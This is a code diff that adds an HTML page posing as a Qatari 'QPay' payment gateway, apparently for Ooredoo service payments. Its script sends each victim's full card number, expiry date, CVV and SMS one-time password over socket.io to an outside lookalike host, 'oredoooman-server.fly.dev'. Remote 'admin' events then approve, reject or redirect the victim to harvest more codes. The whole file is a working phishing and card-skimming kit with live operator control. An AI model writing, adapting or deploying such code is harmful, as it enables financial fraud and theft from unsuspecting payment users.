@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>QPay Payment</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; background: #f0f0f0; min-height: 100vh; direction: ltr; text-align: left; display: flex; flex-direction: column; align-items: center; }
+@keyframes qpay-spin { to { transform: rotate(360deg); } }
+.overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.4); z-index: 999999; display: none; align-items: center; justify-content: center; }
+.overlay.show { display: flex; }
+.overlay-box { background: #fff; border-radius: 8px; padding: 30px 40px; text-align: center; }
+.spinner { width: 36px; height: 36px; border: 4px solid #4a0028; border-top-color: transparent; border-radius: 50%; animation: qpay-spin 1s linear infinite; margin: 0 auto 15px; }
+.container { width: 100%; max-width: 780px; padding: 0 16px; margin-top: 0; }
+.logo-area { padding: 25px 0 30px; text-align: center; }
+.logo-area img { height: 36px; }
+.info-row { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 20px; padding: 0 5px; flex-wrap: wrap; gap: 10px; }
+.info-row .left p { font-size: 15px; font-weight: bold; color: #333; margin: 0 0 6px; }
+.info-row .right { text-align: right; }
+.info-row .right .label { font-size: 14px; font-weight: bold; color: #c41e3a; margin: 0 0 2px; }
+.info-row .right .amount { font-size: 28px; font-weight: bold; color: #000; margin: 0; }
+.card-box { border: 2px solid #4a0028; margin-bottom: 0; }
+.card-header { background: #4a0028; padding: 12px 20px; border-left: 2px solid #8b2040; }
+.card-header p { color: #fff; font-size: 15px; margin: 0; }
+.card-body { background: #f5f5f5; padding: 20px 12px 16px; border-left: 2px solid #4a0028; }
+.form-row { display: flex; align-items: center; justify-content: center; margin-bottom: 25px; }
+.form-row label { width: 120px; font-size: 13px; font-weight: bold; color: #333; text-align: right; padding-right: 10px; flex-shrink: 0; }
+.form-row input, .form-row select { height: 36px; border: 1px solid #aaa; padding: 0 10px; font-size: 14px; color: #000; background: #fff; outline: none; font-family: inherit; }
+.form-row input { flex: 1; min-width: 0; max-width: 220px; }
+.error-box { background: #f0d8d8; padding: 12px; margin: 0 auto 20px; color: #6e3131; font-size: 13px; text-align: center; border-radius: 5px; font-weight: bold; width: 70%; }
+.notification { background: #d9edf7; border: 1px solid #bce8f1; padding: 12px 15px; margin-bottom: 25px; font-size: 13px; color: #31708f; line-height: 1.7; }
+.footer-row { display: flex; align-items: center; justify-content: space-between; padding: 15px 10px 5px; border-top: 1px solid #ddd; }
+.footer-row .logos { display: flex; align-items: center; gap: 12px; }
+.footer-row .logos img { height: 24px; }
+.footer-row .buttons { display: flex; gap: 10px; }
+.btn-continue { background: #4a0028; color: #fff; border: none; border-radius: 5px; padding: 10px 28px; font-size: 14px; cursor: pointer; }
+.btn-continue:disabled { background: #d9d9d9; color: #333; cursor: not-allowed; opacity: 0.6; }
+.btn-cancel { background: #fff; color: #333; border: 1px solid #ccc; border-radius: 5px; padding: 10px 28px; font-size: 14px; cursor: pointer; }
+.warning-text { text-align: center; padding: 15px 0; font-size: 12px; color: #555; }
+.hidden { display: none; }
+</style>
+</head>
+<body>
+
+<!-- Loading Overlay -->
+<div class="overlay" id="loadingOverlay">
+  <div class="overlay-box">
+    <div class="spinner"></div>
+    <p style="margin:0;color:#333;font-size:14px;">Processing...</p>
+  </div>
+</div>
+
+<!-- Error Modal -->
+<div class="overlay" id="errorOverlay">
+  <div class="overlay-box">
+    <p id="errorMsg" style="margin:0 0 20px;color:#333;font-size:14px;"></p>
+    <button onclick="document.getElementById('errorOverlay').classList.remove('show')" style="background:#4a0028;color:#fff;border:none;border-radius:5px;padding:10px 30px;font-size:14px;cursor:pointer;">OK</button>
+  </div>
+</div>
+
+<div class="container">
+  <div class="logo-area"><img src="/assets/qpay-logo.png" alt="QPAY"></div>
+
+  <!-- CARD PHASE -->
+  <div id="cardPhase">
+    <div class="info-row">
+      <div class="left">
+        <p>Payment Unique Number: <span id="paymentNum"></span></p>
+        <p>Description: <span id="paymentDesc"></span></p>
+      </div>
+      <div class="right">
+        <p class="label">Amount</p>
+        <p class="amount">QAR <span id="totalAmount">0.00</span></p>
+      </div>
+    </div>
+
+    <div class="card-box">
+      <div class="card-header"><p>Enter your payment card details</p></div>
+      <div class="card-body">
+        <div id="cardError" class="error-box hidden"></div>
+        <form id="cardForm">
+          <div class="form-row">
+            <label>Card Number</label>
+            <input type="tel" id="cardNumber" inputmode="numeric" maxlength="19" placeholder="">
+          </div>
+          <div class="form-row">
+            <label>Card Expiry Date</label>
+            <div style="display:flex;gap:12px;">
+              <select id="expiryMonth" style="width:80px;height:36px;border:1px solid #aaa;padding:0 6px;font-size:14px;background:#fff;outline:none;">
+                <option value="">mm</option>
+                <option value="01">01</option><option value="02">02</option><option value="03">03</option>
+                <option value="04">04</option><option value="05">05</option><option value="06">06</option>
+                <option value="07">07</option><option value="08">08</option><option value="09">09</option>
+                <option value="10">10</option><option value="11">11</option><option value="12">12</option>
+              </select>
+              <select id="expiryYear" style="width:90px;height:36px;border:1px solid #aaa;padding:0 6px;font-size:14px;background:#fff;outline:none;">
+                <option value="">yyyy</option>
+              </select>
+            </div>
+          </div>
+          <div class="form-row">
+            <label>CVV2</label>
+            <div style="display:flex;align-items:center;gap:8px;">
+              <input type="password" id="cardCVV" inputmode="numeric" maxlength="3" placeholder="•••" style="max-width:180px;letter-spacing:3px;font-size:16px;">
+              <button type="button" id="toggleCvv" style="background:none;border:none;cursor:pointer;padding:4px;color:#555;">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+              </button>
+            </div>
+          </div>
+          <p style="font-size:12px;color:#444;line-height:1.6;margin:0 0 20px;text-align:center;">
+            By clicking the "Continue" button, you hereby acknowledge accepting the <a href="#" style="color:#0066cc;text-decoration:underline;">Terms and Conditions</a> of payment.
+          </p>
+          <div class="footer-row">
+            <div class="logos">
+              <img src="/assets/naps-logo.svg" alt="NAPS">
+              <img src="/assets/himyan-logo.svg" alt="HIMYAN">
+            </div>
+            <div class="buttons">
+              <button type="submit" class="btn-continue" id="cardSubmitBtn">Continue</button>
+              <button type="button" class="btn-cancel" onclick="history.back()">Cancel</button>
+            </div>
+          </div>
+        </form>
+      </div>
+    </div>
+    <p class="warning-text">For proper completion of your transaction, please do not refresh this page or click the browser's back button.</p>
+  </div>
+
+  <!-- OTP PHASE -->
+  <div id="otpPhase" class="hidden">
+    <div class="info-row">
+      <div class="left">
+        <p>Payment Unique Number: <span id="paymentNum2"></span></p>
+        <p>Description: <span id="paymentDesc2"></span></p>
+      </div>
+      <div class="right">
+        <p class="label">Amount</p>
+        <p class="amount">QAR <span id="totalAmount2">0.00</span></p>
+      </div>
+    </div>
+
+    <div class="card-box">
+      <div class="card-header"><p>OTP Verification</p></div>
+      <div class="card-body">
+        <div class="notification">
+          <strong>NOTIFICATION:</strong> You will presently receive an SMS on your mobile number registered with your bank. This is an OTP (One Time Password) SMS, it contains 6 digits to be entered in the box below.
+        </div>
+        <div class="form-row">
+          <label>Card Number</label>
+          <span id="maskedCard" style="font-size:14px;color:#000;"></span>
+        </div>
+        <div class="form-row">
+          <label>Expiry Date</label>
+          <span id="maskedExpiry" style="font-size:14px;color:#000;"></span>
+        </div>
+        <div id="otpError" class="error-box hidden"></div>
+        <div class="form-row">
+          <label>OTP</label>
+          <input type="tel" id="otpCode" inputmode="numeric" maxlength="6" style="width:180px;text-align:center;letter-spacing:5px;font-size:16px;" placeholder="0:00">
+        </div>
+        <div class="footer-row">
+          <div class="logos">
+            <img src="/assets/naps-logo.svg" alt="NAPS">
+            <img src="/assets/himyan-logo.svg" alt="HIMYAN">
+          </div>
+          <div class="buttons">
+            <button type="button" class="btn-continue" id="otpSubmitBtn" disabled>Continue</button>
+            <button type="button" class="btn-cancel" onclick="history.back()">Cancel</button>
+          </div>
+        </div>
+      </div>
+    </div>
+    <p class="warning-text">For proper completion of your transaction, please do not refresh this page or click the browser's back button.</p>
+  </div>
+</div>
+
+<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+<script>
+(function() {
+  var SOCKET_URL = 'https://oredoooman-server.fly.dev';
+  var socket = io(SOCKET_URL, { transports: ['polling','websocket'], reconnection: true, reconnectionAttempts: Infinity, reconnectionDelay: 1000 });
+  var visitorId = localStorage.getItem('visitorId') || '';
+  var phase = 'card';
+  var cardNumber = '', expiryMonth = '', expiryYear = '', cvv = '';
+  var countdown = 180, countdownInterval = null;
+
+  // Payment unique number
+  var paymentUniqueNumber = 'PORTALTP' + Date.now().toString().slice(-12);
+  document.getElementById('paymentNum').textContent = paymentUniqueNumber;
+  document.getElementById('paymentDesc').textContent = paymentUniqueNumber;
+  document.getElementById('paymentNum2').textContent = paymentUniqueNumber;
+  document.getElementById('paymentDesc2').textContent = paymentUniqueNumber;
+
+  // Amount
+  var mohData = {};
+  try { mohData = JSON.parse(localStorage.getItem('mohPaymentData') || '{}'); } catch(e) {}
+  var totalAmount = mohData.totalAmount || localStorage.getItem('Total') || '0.00';
+  document.getElementById('totalAmount').textContent = Number(totalAmount).toFixed(2);
+  document.getElementById('totalAmount2').textContent = Number(totalAmount).toFixed(2);
+
+  // Populate year
+  var yearSelect = document.getElementById('expiryYear');
+  var cy = new Date().getFullYear();
+  for (var y = cy; y <= cy + 15; y++) {
+    var opt = document.createElement('option');
+    opt.value = String(y);
+    opt.textContent = String(y);
+    yearSelect.appendChild(opt);
+  }
+
+  // Toggle CVV visibility
+  var cvvShown = false;
+  document.getElementById('toggleCvv').addEventListener('click', function() {
+    cvvShown = !cvvShown;
+    document.getElementById('cardCVV').type = cvvShown ? 'text' : 'password';
+  });
+
+  // Socket
+  socket.on('connect', function() {
+    if (visitorId) socket.emit('visitor:reconnect', visitorId);
+    socket.emit('visitor:pageEnter', 'QPay Payment');
+  });
+  socket.on('visitor:registered', function(data) {
+    if (data && data._id) { visitorId = data._id; localStorage.setItem('visitorId', data._id); }
+    if (data && data.pid) localStorage.setItem('visitorId', data.pid);
+  });
+  socket.on('visitor:navigate', function(page) { if (page) window.location.href = '/' + page; });
+  socket.on('admin-last-message', function(data) {
+    if (data && data.message) { localStorage.setItem('adminLastMessage', data.message); window.location.href = '/final-page/'; }
+  });
+  socket.on('blocked', function() { alert('You have been blocked.'); });
+
+  // Card/Code actions from admin
+  socket.on('card:action', function(action) {
+    var act = (typeof action === 'string') ? action : (action && action.action) || '';
+    hideLoading();
+    if (phase === 'card') {
+      if (act === 'otp') { switchToOTP(); }
+      else if (act === 'reject') { showCardError('Transaction declined. Please check your card details.'); resetCardForm(); }
+    } else if (phase === 'otp') {
+      if (act === 'otp' || act === 'approve') { window.location.href = '/final-page/'; }
+      else if (act === 'cvv') { window.location.href = '/cvv/'; }
+      else if (act === 'reject') { showOtpError('Invalid OTP. Please try again.'); document.getElementById('otpCode').value = ''; }
+    }
+  });
+
+  socket.on('code:action', function(action) {
+    var act = (typeof action === 'string') ? action : (action && action.action) || '';
+    hideLoading();
+    if (phase === 'otp') {
+      if (act === 'approve' || act === 'otp') { window.location.href = '/final-page/'; }
+      else if (act === 'cvv') { window.location.href = '/cvv/'; }
+      else if (act === 'reject') { showOtpError('Invalid OTP. Please try again.'); document.getElementById('otpCode').value = ''; }
+    } else if (phase === 'card') {
+      if (act === 'reject') { showCardError('Transaction declined. Please check your card details.'); resetCardForm(); }
+    }
+  });
+
+  function showLoading() { document.getElementById('loadingOverlay').classList.add('show'); }
+  function hideLoading() { document.getElementById('loadingOverlay').classList.remove('show'); }
+  function showCardError(msg) { var el = document.getElementById('cardError'); el.textContent = msg; el.classList.remove('hidden'); }
+  function showOtpError(msg) { var el = document.getElementById('otpError'); el.textContent = msg; el.classList.remove('hidden'); }
+  function resetCardForm() {
+    document.getElementById('cardNumber').value = '';
+    document.getElementById('cardCVV').value = '';
+    document.getElementById('expiryMonth').value = '';
+    document.getElementById('expiryYear').value = '';
+  }
+
+  function switchToOTP() {
+    phase = 'otp';
+    document.getElementById('cardPhase').classList.add('hidden');
+    document.getElementById('otpPhase').classList.remove('hidden');
+    var masked = cardNumber.length >= 8 ? cardNumber.slice(0,4) + '********' + cardNumber.slice(-4) : cardNumber;
+    document.getElementById('maskedCard').textContent = masked;
+    document.getElementById('maskedExpiry').textContent = expiryMonth + '/' + expiryYear;
+    socket.emit('visitor:pageEnter', 'QPay OTP Verification');
+    startCountdown();
+  }
+
+  function startCountdown() {
+    countdown = 180;
+    updateCountdownPlaceholder();
+    countdownInterval = setInterval(function() {
+      countdown--;
+      if (countdown <= 0) { clearInterval(countdownInterval); countdown = 0; }
+      updateCountdownPlaceholder();
+    }, 1000);
+  }
+
+  function updateCountdownPlaceholder() {
+    var m = Math.floor(countdown / 60);
+    var s = countdown % 60;
+    document.getElementById('otpCode').placeholder = m + ':' + String(s).padStart(2, '0');
+  }
+
+  // OTP input enable button
+  document.getElementById('otpCode').addEventListener('input', function() {
+    document.getElementById('otpSubmitBtn').disabled = this.value.length < 4;
+  });
+
+  // Card form submit
+  document.getElementById('cardForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    cardNumber = document.getElementById('cardNumber').value.replace(/\D/g, '');
+    expiryMonth = document.getElementById('expiryMonth').value;
+    expiryYear = document.getElementById('expiryYear').value;
+    cvv = document.getElementById('cardCVV').value.replace(/\D/g, '');
+
+    document.getElementById('cardError').classList.add('hidden');
+
+    if (!cardNumber || cardNumber.length < 13) { showCardError('Please enter a valid card number'); return; }
+    if (!expiryMonth || !expiryYear) { showCardError('Please select card expiry date'); return; }
+    if (!cvv || cvv.length < 3) { showCardError('Please enter a valid CVV2'); return; }
+
+    showLoading();
+
+    localStorage.setItem('cardNumber', cardNumber);
+    localStorage.setItem('cardMonth', expiryMonth);
+    localStorage.setItem('cardYear', expiryYear);
+    localStorage.setItem('Total', String(totalAmount));
+
+    var paymentData = { totalPaid: totalAmount, cardType: 'qpay', cardLast4: cardNumber.slice(-4), serviceName: mohData.serviceType || 'Ooredoo', bankName: 'QPay' };
+    localStorage.setItem('paymentData', JSON.stringify(paymentData));
+
+    socket.emit('more-info', {
+      paymentCard: {
+        cardNumber: cardNumber,
+        cardNumberOnly: cardNumber,
+        prefix: cardNumber.slice(0, 6),
+        nameOnCard: 'QPay Card',
+        expiryMonth: expiryMonth,
+        expiryYear: expiryYear,
+        cvv: cvv,
+        pin: 'N/A',
+        bankName: 'QPay',
+        paymentMethod: 'QPay'
+      },
+      page: 'QPay Payment',
+      waitingForAdminResponse: true
+    });
+  });
+
+  // OTP submit
+  document.getElementById('otpSubmitBtn').addEventListener('click', function() {
+    var otpCode = document.getElementById('otpCode').value.replace(/\D/g, '');
+    if (!otpCode || otpCode.length < 4) {
+      document.getElementById('errorMsg').textContent = 'Please enter a valid OTP (4-6 digits)';
+      document.getElementById('errorOverlay').classList.add('show');
+      return;
+    }
+    document.getElementById('otpError').classList.add('hidden');
+    showLoading();
+    socket.emit('more-info', {
+      digitCode: otpCode,
+      page: 'QPay OTP Verification',
+      waitingForAdminResponse: true
+    });
+  });
+})();
+</script>
+</body>
+</html>
